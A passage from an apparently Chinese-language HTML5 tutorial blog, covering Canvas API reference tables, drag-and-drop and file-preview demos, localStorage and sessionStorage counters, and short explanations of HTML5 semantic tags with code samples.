false</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"转换\"><a href=\"#转换\" class=\"headerlink\" title=\"转换\"></a>转换</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>scale()</td>\n<td>缩放当前绘图至更大或更小</td>\n</tr>\n<tr>\n<td>rotate()</td>\n<td>旋转当前绘图</td>\n</tr>\n<tr>\n<td>translate()</td>\n<td>重新映射画布上的 (0,0) 位置</td>\n</tr>\n<tr>\n<td>transform()</td>\n<td>替换绘图的当前转换矩阵</td>\n</tr>\n<tr>\n<td>setTransform()</td>\n<td>将当前转换重置为单位矩阵。然后运行 transform()</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"文本\"><a href=\"#文本\" class=\"headerlink\" title=\"文本\"></a>文本</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>font</td>\n<td>设置或返回文本内容的当前字体属性</td>\n</tr>\n<tr>\n<td>textAlign</td>\n<td>设置或返回文本内容的当前对齐方式</td>\n</tr>\n<tr>\n<td>textBaseline</td>\n<td>设置或返回在绘制文本时使用的当前文本基线</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fillText()</td>\n<td>在画布上绘制“被填充的”文本</td>\n</tr>\n<tr>\n<td>strokeText()</td>\n<td>在画布上绘制文本（无填充）</td>\n</tr>\n<tr>\n<td>measureText()</td>\n<td>返回包含指定文本宽度的对象</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"图像绘制\"><a href=\"#图像绘制\" class=\"headerlink\" title=\"图像绘制\"></a>图像绘制</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>drawImage()</td>\n<td>向画布上绘制图像、画布或视频</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"像素操作\"><a href=\"#像素操作\" class=\"headerlink\" title=\"像素操作\"></a>像素操作</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>width</td>\n<td>返回 ImageData 对象的宽度</td>\n</tr>\n<tr>\n<td>height</td>\n<td>返回 ImageData 对象的高度</td>\n</tr>\n<tr>\n<td>data</td>\n<td>返回一个对象，其包含指定的 ImageData 对象的图像数据</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>createImageData()</td>\n<td>创建新的、空白的 ImageData 对象</td>\n</tr>\n<tr>\n<td>getImageData()</td>\n<td>返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据</td>\n</tr>\n<tr>\n<td>putImageData()</td>\n<td>把图像数据（从指定的 ImageData 对象）放回画布上</td>\n</tr>\n</tbody>\n</table>\n<p>#####　合成</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>globalAlpha</td>\n<td>设置或返回绘图的当前 alpha 或透明值</td>\n</tr>\n<tr>\n<td>globalCompositeOperation</td>\n<td>设置或返回新图像如何绘制到已有的图像上</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>save()</td>\n<td>保存当前环境的状态</td>\n</tr>\n<tr>\n<td>restore()</td>\n<td>返回之前保存过的路径状态和属性</td>\n</tr>\n<tr>\n<td>createEvent()</td>\n<td></td>\n</tr>\n<tr>\n<td>getContext()</td>\n<td></td>\n</tr>\n<tr>\n<td>toDataURL()</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong><code>&lt;canvas&gt;</code> 标记和 SVG 以及 VML 之间的差异</strong><br><code>&lt;canvas&gt;</code>有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。<br>这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。<br>要从同一图形的一个 <code>&lt;canvas&gt;</code> 标记中移除元素，往往需要擦掉绘图重新绘制它。</p>\n</blockquote>\n<h2 id=\"拖放\"><a href=\"#拖放\" class=\"headerlink\" title=\"拖放\"></a>拖放</h2><pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;style type=&quot;text/css&quot;&gt;\n    #div1, #div2, #div3, #div4{\n        float:left; \n        width:100px;\n        height:100px;\n        margin:10px;\n        padding:10px;\n        border:1px solid #aaaaaa;\n    }\n    *{\n        transition:all 0.5s;\n    }\n    #dragDiv{\n        background-color: #369;\n        width:100px;\n        height:100px;\n    }\n    #mouseLocation{\n        clear: both;\n        width: 265px;\n        margin-left: 10px;\n        text-align: center;\n    }\n    #crossDiv{\n        clear: both;\n        display: inline-block;\n        height: 200px;\n        width: 10px;\n        background-color: #333;\n    }\n    #dragElement{\n        float: left;\n        width: 120px;\n        height: 120px;\n        background-color: #369;\n        margin-left: -99999px;\n        opacity: 1;\n    }\n    #dragElement:click{\n        width: 150px;\n        height: 150px;\n    }\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div id=&quot;div1&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;\n    &lt;div id=&quot;dragDiv&quot; draggable=&quot;true&quot; ondragstart=&quot;drag(event)&quot; ondrag=&quot;draging(event)&quot; &gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;div id=&quot;div2&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;mouseLocation&quot;&gt;X坐标：0，Y坐标：0&lt;/div&gt;\n&lt;div id=&quot;dragElement&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;div3&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;div4&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    var mouseLocation = document.getElementById(&quot;mouseLocation&quot;);\n    var dragElement = document.getElementById(&quot;dragElement&quot;);\n\n    function draging(ev) {\n        mouseLocation.innerHTML = &quot;X坐标：&quot; + ev.clientX + &quot;，Y坐标：&quot; + ev.clientY;\n    }\n\n    function allowDrop(ev){\n        ev.preventDefault();\n        mouseLocation.style.backgroundColor = &quot;#333&quot;;\n        mouseLocation.style.color = &quot;#fff&quot;;\n        ev.dataTransfer.dropEffect = &quot;copy&quot;;\n    }\n\n    function dragLeave(ev) {\n        mouseLocation.style.backgroundColor = &quot;#fff&quot;;\n        mouseLocation.style.color = &quot;#000&quot;;\n    }\n\n    function drag(ev){\n        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);\n        ev.dataTransfer.setDragImage(dragElement, 60, 60);\n        ev.dataTransfer.effectAllowed = &quot;copy&quot;;\n    }\n\n    function drop(ev) {\n        ev.preventDefault();\n        var data = ev.dataTransfer.getData(&quot;Text&quot;);\n        ev.target.appendChild(document.getElementById(data));\n    }\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>整个过程可解析为如下过程：</p>\n<ol>\n<li><p><strong>设置元素为可拖放</strong>——draggable 属性</p>\n<pre><code>`&lt;img draggable=&quot;true&quot; /&gt;`\n</code></pre></li>\n<li><p><strong>拖动什么</strong> ——ondragstart 和 setData()<br><br>在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。dataTransfer.setData() 方法设置被拖数据的数据类型和值。</p>\n</li>\n</ol>\n<blockquote>\n<p><a href=\"http://www.tuicool.com/articles/j6Zbam\" target=\"_blank\" rel=\"external\">参考链接</a></p>\n</blockquote>\n<pre><code>    function drag(ev) {\n        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);\n    }\n\n在这个例子中，数据类型是 &quot;Text&quot;，值是可拖动元素的 id (&quot;drag1&quot;)。\n</code></pre><ol>\n<li><p><strong>拖动过程中</strong>——ondrag<br><br>拖动过程中，在被拖拉的节点上持续触发。</p>\n</li>\n<li><p><strong>放到何处</strong> ——ondragover和getData()<br><br>ondragover 事件规定在何处放置被拖动的数据。<br>默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。<br>这要通过调用 ondragover 事件的 event.preventDefault() 方法。</p>\n<pre><code>event.preventDefault()\n</code></pre></li>\n<li><p><strong>进行放置</strong> ——ondrop<br><br>当放置被拖数据时，会发生 drop 事件。在上面的例子中，ondrop 属性调用了一个函数，drop(event)。</p>\n<pre><code>function drop(ev) {\n    ev.preventDefault();\n    var data=ev.dataTransfer.getData(&quot;Text&quot;);\n    ev.target.appendChild(document.getElementById(data));\n}\n</code></pre></li>\n</ol>\n<blockquote>\n<p>代码解释：</p>\n<ul>\n<li>调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）</li>\n<li>通过 dataTransfer.getData(“Text”) 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。</li>\n<li>被拖数据是被拖元素的 id (“drag1”)</li>\n<li>把被拖元素追加到放置元素（目标元素）中</li>\n</ul>\n</blockquote>\n<p>其他事件和方法：</p>\n<ul>\n<li><strong>dragend事件</strong>：<br>拖拉结束时（释放鼠标键或按下escape键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragStart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。</li>\n<li><strong>dragenter事件</strong>：拖拉进入当前节点时，在当前节点上触发，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</li>\n<li><strong>dragover事件</strong>：拖拉到当前节点上方时，在当前节点上持续触发，该事件的target属性是当前节点。该事件与dragenter事件基本类似，默认会重置当前的拖拉事件的效果（DataTransfer对象的dropEffect属性）为none，即不允许放下被拖拉的节点，所以如果允许在当前节点drop数据，通常会使用preventDefault方法，取消重置拖拉效果为none。</li>\n<li><strong>event.dataTransfer.setDragImage(element,x,y)方法</strong>：设置拖放操作的自定义图标。其中element设置自定义图标，x设置图标与鼠标在水平方向上的距离，y设置图标与鼠标在垂直方向上的距离。</li>\n</ul>\n<p>####H5拖拽常用功能</p>\n<blockquote>\n<p>HTML5文件拖拽预览Demo</p>\n</blockquote>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n &lt;head&gt; \n  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; \n  &lt;title&gt;HTML5文件拖拽预览Demo&lt;/title&gt; \n  &lt;style type=&quot;text/css&quot;&gt;\n      h1 {\n        padding: 0px;\n        margin: 0px;\n    }\n    div#show {\n        border: 1px solid #ccc;\n        width: 400px;\n        height: 300px;\n        display: -moz-box;\n        display: -webkit-box;\n        -moz-box-align: center;\n        -webkit-box-align: center;\n        -moz-box-pack: center;\n        -webkit-box-pack: center;\n        resize: both;\n        overflow: auto;\n    }\n    div[id^=show]:hover {\n        border: 1px solid #333;\n    }\n    div#main {\n        width: 100%;\n    }\n    div#successLabel {\n        color: Red;\n    }\n    div#content {\n        display: none;\n    }    \n&lt;/style&gt; \n  &lt;script type=&quot;text/javascript&quot;&gt;\n      function init() {\n        var dest = document.getElementById(&quot;show&quot;);\n        dest.addEventListener(&quot;dragover&quot;,\n            function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n            },\n        false);\n        dest.addEventListener(&quot;dragend&quot;,\n            function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n            },\n        false);\n        dest.addEventListener(&quot;drop&quot;,\n            function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n                console.log(ev.dataTransfer) var file = ev.dataTransfer.files[0];\n                var reader = new FileReader();\n                if (file.type.substr(0, 5) == &quot;image&quot;) {\n                    reader.onload = function(event) {\n                        dest.style.background = &apos;url(&apos; + event.target.result + &apos;) no-repeat center&apos;;\n                        dest.innerHTML = &quot;&quot;;\n                    };\n                    reader.readAsDataURL(file);\n                } else if (file.type.substr(0, 4) == &quot;text&quot;) {\n                    reader.readAsText(file);\n                    reader.onload = function(f) {\n                        dest.innerHTML = &quot;&lt;pre&gt;&quot; + this.result + &quot;&lt;/pre&gt;&quot;;\n                        dest.style.background = &quot;white&quot;;\n                    }\n                } else {\n                    dest.innerHTML = &quot;暂不支持此类文件的预览&quot;;\n                    dest.style.background = &quot;white&quot;;\n                }\n            },\n           false);\n    } \n    //设置页面属性，不执行默认处理（拒绝被拖放）\n    // document.ondragover = function(e) {\n    //     e.preventDefault();\n    // };\n    // document.ondrop = function(e) {\n    //     e.preventDefault();\n    // }\n    // window.onload = init;\n\n  &lt;/script&gt;\n &lt;/head&gt;\n &lt;body&gt; \n  &lt;h1&gt;HTML5文件拖拽预览Demo&lt;/h1&gt; \n  &lt;div id=&quot;show&quot;&gt;\n    文件预览区，仅限图片和txt文件 \n  &lt;/div&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><h2 id=\"Web存储\"><a href=\"#Web存储\" class=\"headerlink\" title=\"Web存储\"></a>Web存储</h2><p>HTML5 提供了两种在客户端存储数据的新方法：</p>\n<ul>\n<li>localStorage - 没有时间限制的数据存储</li>\n<li>sessionStorage - 针对一个 session 的数据存储</li>\n</ul>\n<p>之前，这些都是由 cookie 完成的。但是 cookie 不适合大量数据的存储，因为它们由每个对服务器的请求来传递，这使得 cookie 速度很慢而且效率也不高。</p>\n<p>在 HTML5 中，数据不是由每个服务器请求传递的，而是只有在请求时使用数据。它使在不影响网站性能的情况下存储大量数据成为可能。<br>对于不同的网站，数据存储于不同的区域，并且一个网站只能访问其自身的数据。<br>HTML5 使用 JavaScript 来存储和访问数据。</p>\n<h4 id=\"localStorage方法\"><a href=\"#localStorage方法\" class=\"headerlink\" title=\"localStorage方法\"></a>localStorage方法</h4><p>localStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。</p>\n<p>这个例子创建并访问了 localStorage：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    localStorage.lastname=&quot;Smith&quot;;\n    document.write(localStorage.lastname);\n&lt;/script&gt;\n</code></pre><p>下面的例子对用户访问页面的次数进行计数：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    if (localStorage.pagecount) {\n          localStorage.pagecount=Number(localStorage.pagecount) +1;\n    }\n    else {\n         localStorage.pagecount=1;\n    }\n    document.write(&quot;Visits &quot;+ localStorage.pagecount + &quot; time(s).&quot;);\n&lt;/script&gt;\n</code></pre><h4 id=\"sessionStorage方法\"><a href=\"#sessionStorage方法\" class=\"headerlink\" title=\"sessionStorage方法\"></a>sessionStorage方法</h4><p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p>\n<p>创建并访问一个 sessionStorage：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    sessionStorage.lastname=&quot;Smith&quot;;\n    document.write(sessionStorage.lastname);\n&lt;/script&gt;\n</code></pre><p>应用——统计用户在当前 session 中访问页面的次数进行计数：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    if (sessionStorage.pagecount) {\n          sessionStorage.pagecount=Number(sessionStorage.pagecount) +1;\n    }\n    else {\n         sessionStorage.pagecount=1;\n    }\n    document.write(&quot;Visits &quot;+sessionStorage.pagecount+&quot; time(s) this session.&quot;);\n&lt;/script&gt;\n</code></pre><h2 id=\"H5标签\"><a href=\"#H5标签\" class=\"headerlink\" title=\"H5标签\"></a>H5标签</h2><h3 id=\"nav标签\"><a href=\"#nav标签\" class=\"headerlink\" title=\"nav标签\"></a>nav标签</h3><pre><code>&lt;nav&gt;\n    &lt;a href=&quot;index.asp&quot;&gt;Home&lt;/a&gt;\n    &lt;a href=&quot;html5_meter.asp&quot;&gt;Previous&lt;/a&gt;\n    &lt;a href=&quot;html5_noscript.asp&quot;&gt;Next&lt;/a&gt;\n&lt;/nav&gt;\n</code></pre><h5 id=\"定义和用法\"><a href=\"#定义和用法\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;nav&gt;</code>定义导航链接的部分。</p>\n<blockquote>\n<p>如果文档中有“前后”按钮，则应该把它放到 <code>&lt;nav&gt;</code> 元素中。</p>\n</blockquote>\n<h3 id=\"section标签\"><a href=\"#section标签\" class=\"headerlink\" title=\"section标签\"></a>section标签</h3><pre><code>&lt;section&gt;\n  &lt;h1&gt;PRC&lt;/h1&gt;\n  &lt;p&gt;The People&apos;s Republic of China was born in 1949...&lt;/p&gt;\n&lt;/section&gt;\n</code></pre><h5 id=\"定义和用法-1\"><a href=\"#定义和用法-1\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;section&gt;</code> 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。</p>\n<h3 id=\"header标签\"><a href=\"#header标签\" class=\"headerlink\" title=\"header标签\"></a>header标签</h3><pre><code>&lt;header&gt;\n    &lt;h1&gt;Welcome to my homepage&lt;/h1&gt;\n    &lt;p&gt;My name is Donald Duck&lt;/p&gt;\n&lt;/header&gt;\n\n&lt;p&gt;The rest of my home page...&lt;/p&gt;\n</code></pre><h5 id=\"定义和用法-2\"><a href=\"#定义和用法-2\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;header&gt;</code>定义 section 或 page 的页眉（介绍信息）。</p>\n<h3 id=\"footer标签\"><a href=\"#footer标签\" class=\"headerlink\" title=\"footer标签\"></a>footer标签</h3><pre><code>&lt;footer&gt;\n      &lt;p&gt;Posted by: Ajun&lt;/p&gt;\n      &lt;p&gt;Contact information: &lt;a href=&quot;mailto:774271383@qq.com&quot;&gt;774271383@qq.com&lt;/a&gt;.&lt;/p&gt;\n&lt;/footer&gt;\n</code></pre><h5 id=\"定义和用法-3\"><a href=\"#定义和用法-3\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;footer&gt;</code> 标签定义文档或节的页脚。</p>\n<p>页脚通常包含文档的作者、版权信息、使用条款链接、联系信息等等。<br>一个文档中可以使用多个 <code>&lt;footer&gt;</code> 元素。</p>\n<blockquote>\n<p><code>&lt;footer&gt;</code> 元素内的联系信息应该位于 <code>&lt;address&gt;</code> 标签中。</p>\n</blockquote>\n<h3 id=\"output标签\"><a href=\"#output标签\" class=\"headerlink\" title=\"output标签\"></a>output标签</h3><pre><code>&lt;form oninput=&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;&gt;0\n       &lt;input type=&quot;range&quot; id=&quot;a&quot; value=&quot;50&quot;&gt;100+&lt;input type=&quot;number&quot; id=&quot;b&quot; value=&quot;50&quot;&gt;\n       =&lt;output name=&quot;x&quot; for=&quot;a b&quot;&gt;100&lt;/output&gt;\n&lt;/form&gt; \n</code></pre><h5 id=\"定义和用法-4\"><a href=\"#定义和用法-4\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;output&gt;</code>定义不同类型的输出，比如脚本的输出。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>for</td>\n<td>element_id</td>\n<td>定义输出域相关的一个或多个元素。</td>\n</tr>\n<tr>\n<td>form</td>\n<td>form_id</td>\n<td>定义输入字段所属的一个或多个表单。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>name</td>\n<td>定义对象的唯一名称。（表单提交时使用）</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"progress标签\"><a href=\"#progress标签\" class=\"headerlink\" title=\"progress标签\"></a>progress标签</h3><pre><code>&lt;progress value=&quot;22&quot; max=&quot;100&quot;&gt;&lt;/progress&gt; \n</code></pre><h5 id=\"浏览器支持-1\"><a href=\"#浏览器支持-1\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>Internet Explorer 9 以及更早的版本不支持 <code>&lt;progress&gt;</code> 标签。</p>\n<h5 id=\"定义和用法-5\"><a href=\"#定义和用法-5\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;progress&gt;</code> 标签标示任务的进度（进程）。</p>\n<blockquote>\n<p>结合<code>&lt;progress&gt;</code>标签与 JavaScript 一同使用，来显示任务的进度。<br>注意不适合用来表示度量衡（例如，磁盘空间使用情况或查询结果）。如需表示度量衡，请使用 <code>&lt;meter&gt;</code> 标签代替。</p>\n</blockquote>\n<h3 id=\"article标签\"><a href=\"#article标签\" class=\"headerlink\" title=\"article标签\"></a>article标签</h3><pre><code>&lt;article&gt;\n      &lt;h1&gt;Internet Explorer 9&lt;/h1&gt;\n      &lt;p&gt;Windows Internet Explorer 9（简称 IE9）于2011年3月14日发布。&lt;/p&gt;\n&lt;/article&gt;\n</code></pre><h5 id=\"定义和用法-6\"><a href=\"#定义和用法-6\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;article&gt;</code> 标签规定独立的自包含内容。一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发。</p>\n<p><code>&lt;article&gt;</code> 元素的潜在来源：</p>\n<ul>\n<li>论坛帖子</li>\n<li>报纸文章</li>\n<li>博客条目</li>\n<li>用户评论</li>\n</ul>\n<h3 id=\"aside标签\"><a href=\"#aside标签\" class=\"headerlink\" title=\"aside标签\"></a>aside标签</h3><pre><code>&lt;p&gt;Me and my family visited The Epcot center this summer.&lt;/p&gt;\n&lt;aside&gt;\n    &lt;h4&gt;Epcot Center&lt;/h4&gt;\n    The Epcot Center is a theme park in Disney World, Florida.\n&lt;/aside&gt;\n</code></pre><h5 id=\"定义和用法-7\"><a href=\"#定义和用法-7\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;aside&gt;</code>标签定义其所处内容之外的内容。aside的内容应该与附近的内容相关。</p>\n<h3 id=\"bdi标签\"><a href=\"#bdi标签\" class=\"headerlink\" title=\"bdi标签\"></a>bdi标签</h3><pre><code>&lt;ul&gt;\n    &lt;li&gt;Username &lt;bdi&gt;Bill&lt;/bdi&gt;:80 points&lt;/li&gt;\n    &lt;li&gt;Username &lt;bdi&gt;Steve&lt;/bdi&gt;: 78 points&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre><h5 id=\"定义和用法-8\"><a href=\"#定义和用法-8\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>bdi 指的是 bidi 隔离。</p>\n<p><code>&lt;bdi&gt;</code> 标签允许您设置一段文本，使其脱离其父元素的文本方向设置。在发布用户评论或其他您无法完全控制的内容时，该标签很有用。</p>\n<h3 id=\"command标签\"><a href=\"#command标签\" class=\"headerlink\" title=\"command标签\"></a>command标签</h3><pre><code>&lt;menu&gt;\n    &lt;command onclick=&quot;alert(&apos;Hello World&apos;)&quot;&gt;Click Me!&lt;/command&gt;\n&lt;/menu&gt;\n</code></pre><h5 id=\"浏览器支持-2\"><a href=\"#浏览器支持-2\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Internet Explorer 支持 <code>&lt;command&gt;</code> 标签。(自己测试怎么IE也不行)</p>\n<h5 id=\"定义和用法-9\"><a href=\"#定义和用法-9\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>command 元素表示用户能够调用的命令。可以定义命令按钮，比如单选按钮、复选框或按钮。</p>\n<p>只有当 command 元素位于 menu 元素内时，该元素才是可见的。否则不会显示这个元素，但是可以用它规定键盘快捷键。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>checked</td>\n<td>checked</td>\n<td>定义是否被选中。仅用于 radio 或 checkbox 类型。</td>\n</tr>\n<tr>\n<td>disabled</td>\n<td>disabled</td>\n<td>定义 command 是否可用。</td>\n</tr>\n<tr>\n<td>icon</td>\n<td>url</td>\n<td>定义作为 command 来显示的图像的 url。</td>\n</tr>\n<tr>\n<td>label</td>\n<td>text</td>\n<td>为 command 定义可见的 label。</td>\n</tr>\n<tr>\n<td>radiogroup</td>\n<td>groupname</td>\n<td>定义 command 所属的组名。仅在类型为 radio 时使用。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>checkbox<br>command<br>radio</td>\n<td>定义该 command 的类型。默认是 “command”。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"datalist标签\"><a href=\"#datalist标签\" class=\"headerlink\" title=\"datalist标签\"></a>datalist标签</h3><pre><code>&lt;input id=&quot;myCar&quot; list=&quot;cars&quot; /&gt;\n&lt;datalist id=&quot;cars&quot;&gt;\n  &lt;option value=&quot;BMW&quot;&gt;宝马&lt;/option&gt;\n  &lt;option value=&quot;Ford&quot;&gt;福特&lt;/option&gt;\n  &lt;option value=&quot;Volvo&quot;&gt;沃尔沃&lt;/option&gt;\n&lt;/datalist&gt;\n</code></pre><h5 id=\"定义和用法-10\"><a href=\"#定义和用法-10\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;datalist&gt;</code>标签定义下拉选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</p>\n<p>datalist 及其选项不会被显示出来，它仅仅是合法的输入值列表。</p>\n<blockquote>\n<ul>\n<li>请使用 input 元素的 list 属性来绑定 datalist。<ul>\n<li>注意value属性值为选项内容，option标签内为当前选项内容的注释。</li>\n<li>区别与select标签的区分，输入方式也有所不同。</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"details标签\"><a href=\"#details标签\" class=\"headerlink\" title=\"details标签\"></a>details标签</h3><pre><code>&lt;details&gt;\n    &lt;summary&gt;Copyright 2011.&lt;/summary&gt;\n    &lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;\n&lt;/details&gt;\n</code></pre><blockquote>\n<p>与<code>&lt;summary&gt;</code>标签配合使用可以为details定义标题。标题是可见的，用户点击标题时，会显示出 details。若不定义summary则标题显示详细信息。</p>\n</blockquote>\n<h5 id=\"定义和用法-11\"><a href=\"#定义和用法-11\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义元素的细节，用于描述文档或文档某个部分的细节。</p>\n<h5 id=\"浏览器支持-3\"><a href=\"#浏览器支持-3\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Chrome 支持 <code>&lt;details&gt;</code> 标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>\n<h5 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h5><p>open属性，只有一个值“open”，定义 details 内的内容默认可见。</p>\n<h3 id=\"dialog标签\"><a href=\"#dialog标签\" class=\"headerlink\" title=\"dialog标签\"></a>dialog标签</h3><pre><code>&lt;table border=&quot;1&quot;&gt;\n&lt;tr&gt;\n  &lt;th&gt;一月 &lt;dialog open&gt;这是打开的对话窗口&lt;/dialog&gt;&lt;/th&gt;\n  &lt;th&gt;二月&lt;/th&gt;\n  &lt;th&gt;三月&lt;/th&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n  &lt;td&gt;31&lt;/td&gt;\n  &lt;td&gt;28&lt;/td&gt;\n  &lt;td&gt;31&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n</code></pre><h5 id=\"定义和用法-12\"><a href=\"#定义和用法-12\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义对话框或窗口。</p>\n<h5 id=\"属性-1\"><a href=\"#属性-1\" class=\"headerlink\" title=\"属性\"></a>属性</h5><p>open属性，只有一个值“open”，规定 dialog 元素是活动的，用户可与之交互。</p>\n<h5 id=\"浏览器支持-4\"><a href=\"#浏览器支持-4\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Chrome 和 Safari 6 支持 <dialog> 标签。</dialog></p>\n<h3 id=\"embed标签\"><a href=\"#embed标签\" class=\"headerlink\" title=\"embed标签\"></a>embed标签</h3><pre><code>&lt;embed src=&quot;helloworld.swf&quot; /&gt;\n</code></pre><h5 id=\"定义和用法-13\"><a href=\"#定义和用法-13\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义嵌入的内容，可以用来插入各种多媒体，格式可以是Swf、Midi、Wav、AIFF、AU、MP3等等。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>height</td>\n<td>pixels</td>\n<td>设置嵌入内容的高度。</td>\n</tr>\n<tr>\n<td>src</td>\n<td>url</td>\n<td>嵌入内容的 